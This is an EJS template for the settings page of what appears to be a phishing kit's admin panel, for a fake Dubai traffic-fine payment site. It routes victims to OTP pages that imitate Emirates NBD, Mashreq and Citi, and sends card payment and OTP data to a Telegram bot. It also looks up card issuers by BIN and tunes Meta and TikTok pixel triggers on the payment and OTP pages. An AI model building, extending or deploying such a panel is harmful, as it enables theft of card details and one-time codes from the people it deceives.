<%- include('_layout', { pageTitle: 'Settings', activePage: 'settings', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Database error: <%= dbError %></div>
<% } %>

<% if (saved) { %>
<div class="alert alert-success" style="margin-bottom:16px;">Settings saved successfully.</div>
<% } %>
<% if (error) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Error: <%= error %></div>
<% } %>

<!-- General Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">General Settings</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_settings" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Default OTP Page</label>
          <select name="otp_default_page">
            <option value="otp-sms"     <%= otpDefault==='otp-sms'     ? 'selected' : '' %>>SMS OTP</option>
            <option value="otp"         <%= otpDefault==='otp'         ? 'selected' : '' %>>Emirates NBD</option>
            <option value="otp-mashreq" <%= otpDefault==='otp-mashreq' ? 'selected' : '' %>>Mashreq</option>
            <option value="otp-citi"    <%= otpDefault==='otp-citi'    ? 'selected' : '' %>>Citi</option>
          </select>
          <div class="field-hint">New users on the payment page will be routed to this OTP flow by default.</div>
        </div>

        <div class="form-group">
          <label>Site Status</label>
          <select name="site_active">
            <option value="1" <%= siteActive==='1' ? 'selected' : '' %>>Active</option>
            <option value="0" <%= siteActive==='0' ? 'selected' : '' %>>Maintenance</option>
          </select>
          <div class="field-hint">When set to Maintenance, public pages will display a service notice.</div>
        </div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save General Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- Meta & TikTok Pixel -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Meta Pixel &amp; Conversions API (CAPI)</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings" id="pixel-form">
      <input type="hidden" name="save_pixel" value="1">
      <input type="hidden" name="pixel_event_triggers" id="pixel_event_triggers_input" value="">

      <!-- Meta bölümü -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        Meta (Facebook) Pixel
      </div>
      <div class="form-row">
        <div class="form-group">
          <label>Pixel ID</label>
          <input type="text" name="meta_pixel_id" value="<%= metaPixelId %>" placeholder="1260674512113479" class="mono" autocomplete="off">
          <div class="field-hint">Frontend pixel ID — injected into public pages.</div>
        </div>
        <div class="form-group">
          <label>Access Token (CAPI)</label>
          <input type="text" name="meta_access_token" value="<%= metaAccessToken %>" placeholder="EAAxxxxxxxxxxxxxxx" class="mono" autocomplete="off">
          <div class="field-hint">Server-side Conversions API token from Events Manager.</div>
        </div>
        <div class="form-group">
          <label>Test Event Code</label>
          <input type="text" name="meta_test_event_code" value="<%= metaTestEventCode %>" placeholder="TEST12345" class="mono" autocomplete="off">
          <div class="field-hint">Optional. Leave empty in production.</div>
        </div>
      </div>

      <!-- TikTok bölümü -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;margin-top:8px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        TikTok Pixel
      </div>
      <div class="form-row">
        <div class="form-group">
          <label>TikTok Pixel ID</label>
          <input type="text" name="tiktok_pixel_id" value="<%= tiktokPixelId %>" placeholder="CXXXXXXXXXXXXXXXXX" class="mono" autocomplete="off">
          <div class="field-hint">Found in TikTok Ads Manager → Assets → Events.</div>
        </div>
        <div class="form-group">
          <label>TikTok Access Token (Events API)</label>
          <input type="text" name="tiktok_access_token" value="<%= tiktokAccessToken %>" placeholder="xxxxxxxx..." class="mono" autocomplete="off">
          <div class="field-hint">Server-side Events API token for CAPI.</div>
        </div>
      </div>

      <!-- Event Trigger Configuration -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;margin-top:8px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        Event Trigger Configuration
      </div>
      <div style="margin-bottom:14px;font-size:12px;color:#64748b;line-height:1.5;">
        Her pixel eventi için hangi URL yüklendiğinde veya hangi butona tıklandığında ateşleneceğini belirleyin.
      </div>
      <div style="overflow-x:auto;margin-bottom:16px;border:1.5px solid #e2e8f0;border-radius:10px;">
        <table style="width:100%;border-collapse:collapse;font-size:13px;">
          <thead>
            <tr style="background:#f8fafc;">
              <th style="text-align:left;padding:10px 14px;font-size:11px;font-weight:700;color:#475569;text-transform:uppercase;letter-spacing:.4px;border-bottom:1.5px solid #e2e8f0;">Event</th>
              <th style="text-align:left;padding:10px 14px;font-size:11px;font-weight:700;color:#475569;text-transform:uppercase;letter-spacing:.4px;border-bottom:1.5px solid #e2e8f0;">Platform</th>
              <th style="text-align:left;padding:10px 14px;font-size:11px;font-weight:700;color:#475569;text-transform:uppercase;letter-spacing:.4px;border-bottom:1.5px solid #e2e8f0;">Tip</th>
              <th style="text-align:left;padding:10px 14px;font-size:11px;font-weight:700;color:#475569;text-transform:uppercase;letter-spacing:.4px;border-bottom:1.5px solid #e2e8f0;">Tetikleyici</th>
              <th style="padding:10px 14px;border-bottom:1.5px solid #e2e8f0;"></th>
            </tr>
          </thead>
          <tbody id="trigger-tbody"></tbody>
        </table>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Pixel Ayarlarını Kaydet</button>
      </div>
    </form>
  </div>
</div>

<!-- Pixel Config Modal -->
<div id="pixel-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center;padding:20px;">
  <div style="background:white;border-radius:16px;width:100%;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,0.25);overflow:hidden;display:flex;flex-direction:column;max-height:90vh;">
    <div style="padding:20px 22px 16px;border-bottom:1px solid #e2e8f0;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;">
      <div>
        <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px;">Event Tetikleyici</div>
        <div style="font-size:16px;font-weight:800;color:#0f172a;" id="modal-event-title">Configure</div>
      </div>
      <button onclick="closePixelModal()" style="width:32px;height:32px;border-radius:8px;border:1.5px solid #e2e8f0;background:white;cursor:pointer;font-size:18px;color:#64748b;display:flex;align-items:center;justify-content:center;flex-shrink:0;">×</button>
    </div>

    <!-- Tabs -->
    <div style="display:flex;border-bottom:1px solid #e2e8f0;flex-shrink:0;">
      <button id="tab-btn-url" onclick="switchPixelTab('url')"
        style="flex:1;padding:12px;border:none;background:none;font-size:13px;font-weight:600;cursor:pointer;border-bottom:2px solid transparent;color:#64748b;transition:all .15s;">
        🔗 URL Tetikleyici
      </button>
      <button id="tab-btn-button" onclick="switchPixelTab('button')"
        style="flex:1;padding:12px;border:none;background:none;font-size:13px;font-weight:600;cursor:pointer;border-bottom:2px solid transparent;color:#64748b;transition:all .15s;">
        🖱️ Buton Tetikleyici
      </button>
    </div>

    <!-- Tab content: URL -->
    <div id="pixel-tab-url" style="overflow-y:auto;flex:1;padding:16px 22px;">
      <div style="font-size:12px;color:#64748b;margin-bottom:12px;">Seçilen URL yüklendiğinde event tetiklenir.</div>
      <div id="url-options-list"></div>
    </div>

    <!-- Tab content: Button -->
    <div id="pixel-tab-button" style="display:none;overflow-y:auto;flex:1;padding:16px 22px;">
      <div style="font-size:12px;color:#64748b;margin-bottom:12px;">Seçilen butona tıklandığında event tetiklenir.</div>
      <div id="btn-options-list"></div>
    </div>

    <!-- Modal footer -->
    <div style="padding:14px 22px;border-top:1px solid #e2e8f0;display:flex;gap:10px;justify-content:flex-end;flex-shrink:0;">
      <button onclick="closePixelModal()" class="btn btn-ghost">İptal</button>
      <button onclick="savePixelConfig()" class="btn btn-primary">Kaydet</button>
    </div>
  </div>
</div>

<!-- Telegram & API Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Telegram &amp; API Settings</div>
    <div class="tc-meta">Stored in database — takes precedence over environment variables</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_telegram" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Payment Notification Bot Token</label>
          <input type="text" name="telegram_bot_token"
                 value="<%= telegramToken %>"
                 placeholder="1234567890:ABCDefGhIJKlmNoPQRstuVWxyZ"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Receives card payment and OTP event notifications.</div>
        </div>

        <div class="form-group">
          <label>Telegram Chat ID</label>
          <input type="text" name="telegram_chat_id"
                 value="<%= telegramChatId %>"
                 placeholder="-1001234567890 or 7632086796"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Channel, group, or personal chat ID for all notifications.</div>
        </div>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label>Inquiry (Search) Bot Token</label>
          <input type="text" name="search_telegram_bot_token"
                 value="<%= searchTgToken %>"
                 placeholder="1234567890:ABCDefGhIJKlmNoPQRstuVWxyZ"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Used for plate inquiry search alerts. May be the same as above.</div>
        </div>

        <div class="form-group">
          <label>HandyAPI Key</label>
          <input type="text" name="handy_api_key"
                 value="<%= handyApiKey %>"
                 placeholder="HAS-xxxxxxxxxxxxxxxxxxxx"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">BIN lookup for card issuer/country identification. Get one at handyapi.com.</div>
        </div>
      </div>

      <!-- Admin Panel Alerts toggle -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;margin-top:8px;">
        Admin Panel Alerts
      </div>
      <div class="form-group">
        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;">
          <input type="checkbox" name="admin_tg_alerts" value="1" <%= adminTgAlerts==='1' ? 'checked' : '' %>
                 style="width:16px;height:16px;accent-color:#006837;">
          <span>Login ve kritik işlemlerde (onay, silme, ayar kaydetme) Telegram bildirimi gönder</span>
        </label>
        <div class="field-hint">Yukarıdaki Payment Notification Bot Token ve Chat ID kullanılır.</div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save Telegram &amp; API Settings</button>
        <button type="button" class="btn btn-ghost" onclick="testTelegram()">Send Test Message</button>
      </div>
    </form>
  </div>
</div>

<!-- Change Password -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Change Password</div>
  </div>
  <div class="form-section">

    <% if (pwMsg) { %>
    <div class="alert alert-<%= pwMsg.type === 'success' ? 'success' : 'error' %>" style="max-width:480px;margin-bottom:18px;"><%= pwMsg.text %></div>
    <% } %>

    <form method="POST" action="/admin/settings" style="max-width:480px;">
      <input type="hidden" name="change_password" value="1">

      <div class="form-group">
        <label>New Username <span style="font-weight:400;color:#94a3b8;">(leave empty to keep current)</span></label>
        <input type="text" name="new_username" placeholder="<%= adminUser %>" autocomplete="off">
      </div>
      <div class="form-group">
        <label>Current Password</label>
        <input type="password" name="current_password" placeholder="Enter current password" autocomplete="current-password" required>
      </div>
      <div class="form-group">
        <label>New Password</label>
        <input type="password" name="new_password" placeholder="Minimum 6 characters" autocomplete="new-password" required>
      </div>
      <div class="form-group">
        <label>Confirm New Password</label>
        <input type="password" name="new_password2" placeholder="Repeat new password" autocomplete="new-password" required>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Update Password</button>
      </div>
    </form>
  </div>
</div>

<style>
.form-section { padding: 24px 28px; }
.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
@media (max-width: 700px) { .form-row { grid-template-columns: 1fr; } }
.form-group { margin-bottom: 18px; }
.form-group label {
  display: block; font-size: 11px; font-weight: 700; color: #374151;
  text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px;
}
.form-group input, .form-group select {
  width: 100%; padding: 9px 12px; border: 1.5px solid #e2e8f0;
  border-radius: 8px; font-size: 13px; color: #0f172a; background: #f8fafc;
  outline: none; transition: border-color .15s, box-shadow .15s;
}
.form-group input:focus, .form-group select:focus {
  border-color: #006837; background: #fff;
  box-shadow: 0 0 0 3px rgba(0,104,55,.08);
}
.form-group input.mono { font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; letter-spacing: .2px; }
.field-hint { font-size: 11px; color: #94a3b8; margin-top: 5px; line-height: 1.4; }
.form-actions { display: flex; gap: 10px; padding-top: 6px; flex-wrap: wrap; }
.alert-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
.alert-error   { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
</style>

<script>
async function testTelegram() {
  const token  = document.querySelector('[name=telegram_bot_token]').value.trim();
  const chatId = document.querySelector('[name=telegram_chat_id]').value.trim();
  if (!token || !chatId) { toast('Enter bot token and chat ID first', 'error'); return; }
  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '<b>Admin panel test message</b>\nDubai Fine System — connection verified.', parse_mode: 'HTML' }),
    });
    const d = await r.json();
    if (d.ok) toast('Test message sent successfully');
    else toast('Telegram error: ' + (d.description || 'unknown'), 'error');
  } catch (e) { toast('Connection error: ' + e.message, 'error'); }
}

// ── Pixel Event Trigger Configuration ──────────────────────────────────────────
const PIXEL_URLS = [
  { value: '/',             label: 'Home — Ana Sayfa (/)' },
  { value: '/fines',        label: 'Fines Results — Ceza Sonuçları (/fines)' },
  { value: '/payment',      label: 'Card Payment — Kart Ödeme (/payment)' },
  { value: '/otp-sms',      label: 'SMS OTP Sayfası (/otp-sms)' },
  { value: '/otp',          label: 'Emirates NBD OTP (/otp)' },
  { value: '/otp-mashreq',  label: 'Mashreq OTP (/otp-mashreq)' },
  { value: '/otp-citi',     label: 'Citi OTP (/otp-citi)' },
  { value: '/otp-approved', label: 'Payment Success — Ödeme Başarılı (/otp-approved)' },
];

const PIXEL_BUTTONS = [
  { id: 'search-btn-home',    selector: '#search-btn',  page: '/',         label: '🔍 "Check Fines" butonu — Ana Sayfa (/)' },
  { id: 'pay-btn-fines',      selector: '#pay-btn',     page: '/fines',    label: '💳 "Pay Now" butonu — Fines (/fines)' },
  { id: 'pay-btn-payment',    selector: '#pay-btn',     page: '/payment',  label: '💳 "Submit Payment" butonu — Ödeme (/payment)' },
  { id: 'resend-btn-sms',     selector: '#resend-btn',  page: '/otp-sms',  label: '🔁 "Resend" butonu — SMS OTP (/otp-sms)' },
  { id: 'resend-btn-citi',    selector: '#resend-btn',  page: '/otp-citi', label: '🔁 "Resend" butonu — Citi OTP (/otp-citi)' },
  { id: 'retry-btn-fines',    selector: '.btn-retry',   page: '/fines',    label: '↩️ "Try Again" butonu — Fines (/fines)' },
  { id: 'select-all-fines',   selector: '.sel-btn',     page: '/fines',    label: '☑️ "Select All Payable" — Fines (/fines)' },
  { id: 'cancel-btn-sms',     selector: '.cancel-btn',  page: '/otp-sms',  label: '✖️ "Cancel" butonu — SMS OTP (/otp-sms)' },
];

const PIXEL_EVENTS = [
  { name: 'PageView',          desc: 'Sayfa yüklendiğinde' },
  { name: 'Search',            desc: 'Check Fines butonu tıklanınca' },
  { name: 'InitiateCheckout',  desc: 'Ödemeye geç butonu tıklanınca' },
  { name: 'Purchase',          desc: 'Ödeme onaylandığında' },
  { name: 'SubmitApplication', desc: 'OTP sayfasına ulaşıldığında' },
  { name: 'ViewContent',       desc: 'Ceza listesi yüklendiğinde' },
];

const DEFAULT_TRIGGERS = {
  PageView:          { type: 'url',    value: '/' },
  Search:            { type: 'button', id: 'search-btn-home',   selector: '#search-btn',  page: '/' },
  InitiateCheckout:  { type: 'button', id: 'pay-btn-fines',     selector: '#pay-btn',     page: '/fines' },
  Purchase:          { type: 'url',    value: '/otp-approved' },
  SubmitApplication: { type: 'url',    value: '/otp-sms' },
  ViewContent:       { type: 'url',    value: '/fines' },
};

let pixelTriggers = {};
try {
  const raw = document.getElementById('pixel_event_triggers_input').value;
  pixelTriggers = raw ? JSON.parse(raw) : {};
} catch(e) { pixelTriggers = {}; }

// Sunucudan gelen değerleri doldur
const savedRaw = <%- typeof pixelEventTriggersJson !== 'undefined' ? JSON.stringify(pixelEventTriggersJson) : '"{}"' %>;
try { const parsed = JSON.parse(savedRaw); if (parsed && typeof parsed === 'object') pixelTriggers = parsed; } catch(e) {}

PIXEL_EVENTS.forEach(e => {
  if (!pixelTriggers[e.name]) pixelTriggers[e.name] = DEFAULT_TRIGGERS[e.name];
});

function getTriggerLabel(t) {
  if (!t) return '—';
  if (t.type === 'url') return t.value;
  const btn = PIXEL_BUTTONS.find(b => b.id === t.id);
  return btn ? (t.selector + ' · ' + t.page) : (t.selector || '?');
}

function renderTriggerTable() {
  const tbody = document.getElementById('trigger-tbody');
  if (!tbody) return;
  tbody.innerHTML = PIXEL_EVENTS.map(e => {
    const t = pixelTriggers[e.name] || DEFAULT_TRIGGERS[e.name];
    const typeColor = t.type === 'url' ? '#0284c7' : '#7c3aed';
    const typeBg    = t.type === 'url' ? '#e0f2fe' : '#ede9fe';
    const typeLabel = t.type === 'url' ? 'URL' : 'Buton';
    return `<tr style="border-bottom:1px solid #f1f5f9;">
      <td style="padding:12px 14px;">
        <div style="font-weight:600;color:#0f172a;font-size:13px;">${e.name}</div>
        <div style="font-size:11px;color:#94a3b8;margin-top:1px;">${e.desc}</div>
      </td>
      <td style="padding:12px 14px;">
        <span style="font-size:11px;background:#f1f5f9;color:#475569;padding:3px 8px;border-radius:20px;font-weight:600;">Meta + TikTok</span>
      </td>
      <td style="padding:12px 14px;">
        <span style="font-size:11px;background:${typeBg};color:${typeColor};padding:3px 8px;border-radius:20px;font-weight:700;">${typeLabel}</span>
      </td>
      <td style="padding:12px 14px;font-family:monospace;font-size:12px;color:#475569;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${getTriggerLabel(t)}">${getTriggerLabel(t)}</td>
      <td style="padding:12px 14px;">
        <button type="button" onclick="openPixelModal('${e.name}')" style="padding:5px 12px;border:1.5px solid #e2e8f0;border-radius:6px;background:white;font-size:12px;font-weight:600;color:#374151;cursor:pointer;white-space:nowrap;">⚙ Düzenle</button>
      </td>
    </tr>`;
  }).join('');
}

// URL seçeneklerini render et
function renderUrlOptions(current) {
  return PIXEL_URLS.map(u => `
    <label style="display:flex;align-items:center;gap:12px;padding:10px 12px;border-radius:8px;cursor:pointer;border:1.5px solid ${current && current.type==='url' && current.value===u.value ? '#006837' : '#e2e8f0'};margin-bottom:8px;background:${current && current.type==='url' && current.value===u.value ? '#f0fdf4' : 'white'};transition:all .1s;">
      <input type="radio" name="modal-url-opt" class="pixel-url-opt" value="${u.value}" ${current && current.type==='url' && current.value===u.value ? 'checked' : ''} style="accent-color:#006837;width:16px;height:16px;flex-shrink:0;">
      <div>
        <div style="font-weight:600;font-size:13px;color:#0f172a;font-family:monospace;">${u.value}</div>
        <div style="font-size:11px;color:#64748b;">${u.label.replace(u.value,'').replace(' — ','')}</div>
      </div>
    </label>`).join('');
}

// Buton seçeneklerini render et
function renderBtnOptions(current) {
  return PIXEL_BUTTONS.map(b => `
    <label style="display:flex;align-items:center;gap:12px;padding:10px 12px;border-radius:8px;cursor:pointer;border:1.5px solid ${current && current.type==='button' && current.id===b.id ? '#7c3aed' : '#e2e8f0'};margin-bottom:8px;background:${current && current.type==='button' && current.id===b.id ? '#faf5ff' : 'white'};transition:all .1s;">
      <input type="radio" name="modal-btn-opt" class="pixel-btn-opt" value="${b.id}" ${current && current.type==='button' && current.id===b.id ? 'checked' : ''} style="accent-color:#7c3aed;width:16px;height:16px;flex-shrink:0;">
      <div>
        <div style="font-weight:600;font-size:13px;color:#0f172a;">${b.label}</div>
        <div style="font-size:11px;color:#64748b;font-family:monospace;">${b.selector} · ${b.page}</div>
      </div>
    </label>`).join('');
}

let currentModalEvent = null;

function openPixelModal(eventName) {
  currentModalEvent = eventName;
  const t = pixelTriggers[eventName] || DEFAULT_TRIGGERS[eventName];
  document.getElementById('modal-event-title').textContent = 'Configure: ' + eventName;
  document.getElementById('url-options-list').innerHTML = renderUrlOptions(t);
  document.getElementById('btn-options-list').innerHTML = renderBtnOptions(t);
  switchPixelTab(t ? t.type : 'url');
  document.getElementById('pixel-modal-overlay').style.display = 'flex';

  // radio change → border rengi güncelle
  document.querySelectorAll('.pixel-url-opt').forEach(r => {
    r.addEventListener('change', () => {
      document.getElementById('url-options-list').innerHTML = renderUrlOptions({ type:'url', value: r.value });
    });
  });
  document.querySelectorAll('.pixel-btn-opt').forEach(r => {
    r.addEventListener('change', () => {
      const b = PIXEL_BUTTONS.find(x => x.id === r.value);
      if (b) document.getElementById('btn-options-list').innerHTML = renderBtnOptions({ type:'button', id: b.id, selector: b.selector, page: b.page });
    });
  });
}

function closePixelModal() {
  document.getElementById('pixel-modal-overlay').style.display = 'none';
  currentModalEvent = null;
}

function switchPixelTab(type) {
  const urlPanel = document.getElementById('pixel-tab-url');
  const btnPanel = document.getElementById('pixel-tab-button');
  const urlTabBtn = document.getElementById('tab-btn-url');
  const btnTabBtn = document.getElementById('tab-btn-button');

  if (type === 'url') {
    urlPanel.style.display = 'block'; btnPanel.style.display = 'none';
    urlTabBtn.style.borderBottomColor = '#006837'; urlTabBtn.style.color = '#006837';
    btnTabBtn.style.borderBottomColor = 'transparent'; btnTabBtn.style.color = '#64748b';
  } else {
    urlPanel.style.display = 'none'; btnPanel.style.display = 'block';
    urlTabBtn.style.borderBottomColor = 'transparent'; urlTabBtn.style.color = '#64748b';
    btnTabBtn.style.borderBottomColor = '#7c3aed'; btnTabBtn.style.color = '#7c3aed';
  }
}

function savePixelConfig() {
  if (!currentModalEvent) return;
  const urlActive = document.getElementById('pixel-tab-url').style.display !== 'none';
  if (urlActive) {
    const sel = document.querySelector('.pixel-url-opt:checked');
    if (!sel) { alert('Bir URL seçin.'); return; }
    pixelTriggers[currentModalEvent] = { type: 'url', value: sel.value };
  } else {
    const sel = document.querySelector('.pixel-btn-opt:checked');
    if (!sel) { alert('Bir buton seçin.'); return; }
    const btn = PIXEL_BUTTONS.find(b => b.id === sel.value);
    if (!btn) return;
    pixelTriggers[currentModalEvent] = { type: 'button', id: btn.id, selector: btn.selector, page: btn.page };
  }
  renderTriggerTable();
  document.getElementById('pixel_event_triggers_input').value = JSON.stringify(pixelTriggers);
  closePixelModal();
  if (typeof toast === 'function') toast('Trigger güncellendi — kaydetmeyi unutmayın', 'success');
}

// ESC ile modal kapat
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closePixelModal();
});

// İlk render
renderTriggerTable();
document.getElementById('pixel_event_triggers_input').value = JSON.stringify(pixelTriggers);
</script>

<%- include('_layout_end') %>
